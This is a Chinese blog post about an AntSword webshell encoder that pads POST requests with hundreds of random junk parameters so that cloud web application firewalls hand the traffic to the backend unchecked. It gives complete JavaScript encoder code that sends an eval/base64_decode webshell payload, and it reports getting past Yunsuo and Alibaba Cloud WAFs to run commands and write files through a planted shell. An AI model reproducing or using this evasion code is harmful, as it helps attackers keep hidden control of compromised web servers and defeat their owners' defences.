# 蚁剑编码器之流量混淆


<meta name="referrer" content="no-referrer" />

## 前言

模块很早就写好了，今天才有时间把文章写出来

大家都知道填充垃圾数据可以用于SQL注入的绕过，原理就是WAF在遇到大量的GET或者POST参数的时候就会直接把数据直接抛给后端，从而就可以绕过各种各样恶心的过滤。

原因可能是WAF厂商考虑到防止自身程序对于流量分析时间过长，导致用户正常的业务无法访问，所以不得已直接丢给后端。因为咱也没看过WAF内部的规则是怎么写的，所以暂时这样猜想。

同样的，既然都是直接把数据抛给后端，那么这种办法是否可以用于一句话流量的绕过呢，答案当然是可以的，这也是今天写这篇文章的目的。

## 正文

### 具体实现

在其他例如菜刀，冰蝎这样的管理工具上很难实现，因为扩展性很差。但是强大的蚁剑就可以满足我们的需求。

本来是准备在shell配置信息里加个选项，但是经过考虑还要改蚁剑的结构，不是很方便，所以直接采用了编码器的形式。

这里全部采用了随机的方式来生成垃圾流量，随机变量名长度，随机变量值大小，随机变量个数。

```
let varname_min = 5; //变量名最小长度
  let varname_max = 15; // 变量名最大长度
  let data_min = 200; // 变量值最小长度
  let data_max = 250; // 变量值最大长度
  let num_min = 150; // 变量最小个数
  let num_max = 250; // 变量最大个数
  function randomString(length) { // 生成随机字符串
    //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
  }
  function randomInt(min, max) {   //生成指定范围内的随机数
    return parseInt(Math.random() * (max - min + 1) + min, 10);
  }
  for (let i = 0; i < randomInt(num_min, num_max); i++) {  //将混淆流量放入到payload数组中
    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
  }
```

那么怎么用呢

很简单，就直接放到普通编码器里就可以了，这里以最基础的也是被各类WAF杀得妈都不认的base64编码器为例

```
'use strict';
/*
code by yzddMr6
*/
module.exports = (pwd, data, ext = {}) => {
  let varname_min = 5;
  let varname_max = 15;
  let data_min = 200;
  let data_max = 250;
  let num_min = 100;
  let num_max = 200;
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  data[randomID] = Buffer.from(data['_']).toString('base64');
  function randomString(length) {
    //let chars='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let result = '';
    for (let i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
  }
  function randomInt(min, max) {
    return parseInt(Math.random() * (max - min + 1) + min, 10);
  }
  for (let i = 0; i < randomInt(num_min, num_max); i++) {
    data[randomString(randomInt(varname_min, varname_max))] = randomString(randomInt(data_min, data_max));
  }
  data[pwd] = `@eval(base64_decode($_POST[${randomID}]));`;
  delete data['_'];
  return data;
}
```

### 过云锁测试

本来想用安全狗，结果发现好像免费版不能拦截一句话。

那就用云锁开刀吧。

首先在虚拟机里放个一句话，就直接用星球里的。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369455-b57aa2d5-3b90-45f6-b9c4-c9cb1ed70914.png)

可以正常运行

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369538-70a55a46-56a0-40b8-ac62-c252510baa44.png)

然后使用蚁剑默认的base64编码器连接试一下

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369645-e9227333-70e6-41c2-8262-b785424db16a.png)

云锁直接drop了数据包，没有返回，在云锁控制端显示受到攻击

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369742-44ebc878-ca46-4288-a3e2-2016b3168778.png)

然后使用我们上面的流量混淆编码器

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900369957-63746007-1497-449c-957d-2a70acb6a7c7.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370077-6ec53d5d-14f0-4ad2-99f4-4f2928c239b6.png)

shell正常连接，成功bypass云锁。

### 过阿里云测试

这一部分是后来补上的，因为白嫖的阿里云还有一天就到期了。。。

众所周知阿里云是以封IP著名，一言不合就全网ban你，你不仅站日不了了，甚至很多其他网站都打不开。。。

反正要到期了，码也懒得打了。

首先用backdoor study搭建个环境

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370185-1169c050-8aff-420a-bfbf-046b1475db12.png)

星球里面随便找一个免杀马放上去，星球里未公开的基本都是过阿里云的。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370469-02121aa6-fec3-4d43-b1ef-07b513039016.png)

然后随便找个蚁剑的默认编码器连上去，第一个包还有回显，发第二个包的时候就已经被封IP了

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370710-726b5357-1ccb-4d30-a4c2-a6ad0fd90edc.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900370883-ad7bb739-001e-4afd-8eeb-2f25de9816da.png)

这时候换上加了参数污染后的编码器

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371022-c6b8f105-7748-4583-9e7a-82cdf76586a5.png)

正常执行命令

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371173-42b728fa-5d9e-4cb9-9f4d-2970b640dc43.png)

写文件测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371623-42456d01-7a4d-4138-9cf0-51346b56d76e.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900371745-db176d01-8198-41ff-a759-5edbb95d0133.png)

完全bypass

## 最后

理论上只要是这种云WAF都可以绕过，不管是sql注入也好还是一句话的流量也好，因为通病就是遇到超多处理不了的键值对就会直接扔给后端。

填充垃圾数据不仅仅可以用于php的编码器，所有类型的都可以用，只需要在原来的编码器基础上加上上面那几行神奇的代码，原理都是一样的。

虽然把参数个数改大虽然可以绕过各种waf，但是同样带来一个问题就是响应包会很慢，网络不好的情况下慎用。

若有收获，就点个赞吧

[毅宸]()

今天 11:26

0

0

上一篇

###### an-interesting-shell

下一篇

###### antsword-diy-1

回复

![毅宸](https://cdn.nlark.com/yuque/0/2020/png/1599908/1599487528935-avatar/e0d81bd9-3986-428a-949c-fed9156276b0.png?x-oss-process=image%2Fresize%2Cm_fill%2Cw_64%2Ch_64%2Fformat%2Cpng)

输入  `Ctrl` + `/`  快速插入卡片

 

图片

标签

引入

语雀内容

正文

正文标题 1标题 2标题 3标题 4









Ctrl+B粗体

回复

![语雀](https://gw.alipayobjects.com/mdn/prod_resou/afts/img/A*OwZWQ68zSTMAAAAAAAAAAABkARQnAQ)



[关于语雀]()[使用帮助]()[数据安全]()[服务协议]()[English](?language=en-us)
